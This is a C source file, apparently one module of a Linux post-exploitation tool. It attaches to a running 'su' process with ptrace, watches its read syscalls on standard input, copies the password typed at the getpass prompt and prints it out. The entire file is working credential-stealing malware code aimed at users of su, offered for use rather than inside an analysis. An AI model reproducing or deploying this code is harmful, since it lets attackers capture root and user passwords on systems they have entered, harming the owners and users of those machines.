#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FILE_SUDO_TRACER 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;

void intercept_su(pid_t traced_process) {
  int status = 0;
  int syscall = 0;
  int fd = 0;
  int i = 0;
  int how = 0;
  long read_length = 0;
  long length = 0;
  char *read_string = NULL;
  char *password = NULL;
  struct user_regs_struct regs;

  password = (char *) calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);

  if (!password)
    goto exit_su;

  memset(&regs, 0, sizeof(regs));
  ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status)) {
    goto exit_su;
  }

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    syscall = get_syscall(traced_process);

    // su calls rt_sigprocmask with SIG_SETMASK immediately after the
    // password is captured
    if (syscall == SYSCALL_rt_sigprocmask) {
      how = get_syscall_arg(traced_process, 0);
      if (how == SIG_SETMASK) {
        goto exit_su;
      }
    }

    if (wait_for_syscall(traced_process) != 0)
      break;

    if (syscall == SYSCALL_read) {
      fd = get_syscall_arg(traced_process, 0);
      read_length = get_syscall_arg(traced_process, 2);
      length = get_reg(traced_process, eax);

      // su reads from stdin
      if (fd == 0) {
        // getpass calls read(0, buf, 511); TODO(blendin) change from hardcoded
        if (read_length == 511) {
          read_string = extract_read_string(traced_process, length);

          for (i = 0; i < length && i < MAX_PASSWORD_LEN; i++) {
            if (read_string[i] == '\n')
              break;
            password[i] = read_string[i];
          }

          output("%s\n", password);

          free(read_string);
          read_string = NULL;
          memset(password, 0, MAX_PASSWORD_LEN);
        }
      }
    }
  }

exit_su:
  free(password);
  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}
